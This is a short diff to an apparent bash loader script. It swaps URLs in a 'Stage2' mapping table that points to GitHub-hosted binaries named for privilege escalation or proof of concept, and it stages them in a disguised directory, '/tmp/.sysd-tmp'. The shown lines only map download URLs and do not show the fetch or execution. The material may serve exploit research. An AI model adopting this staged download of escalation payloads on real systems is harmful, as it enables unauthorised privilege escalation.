@@ -13,8 +13,8 @@ TMPDIR_BASE="/tmp/.sysd-tmp"
 
 # ==================== Stage2 URL 映射表 ====================
 declare -A STAGE2_URL_MAP=(
-    ["org"]="https://github.com/Jerryy959/controller/releases/download/v1/escalation-server-a.elf"
-    ["haoc"]="https://github.com/Jerryy959/controller/releases/download/v1/escalation-server-b.elf"
+    ["org"]="https://github.com/Jerryy959/controller/releases/download/v1/poc-oe-original"
+    ["haoc"]="https://github.com/Jerryy959/controller/releases/download/v1/poc-oe-haoc"
     ["ubuntu"]="https://github.com/Jerryy959/controller/releases/download/v1/escalation-db.elf"
     ["test"]="https://github.com/Jerryy959/controller/releases/download/v1/escalation-db.elf" # 仅占位，实际不使用
 )
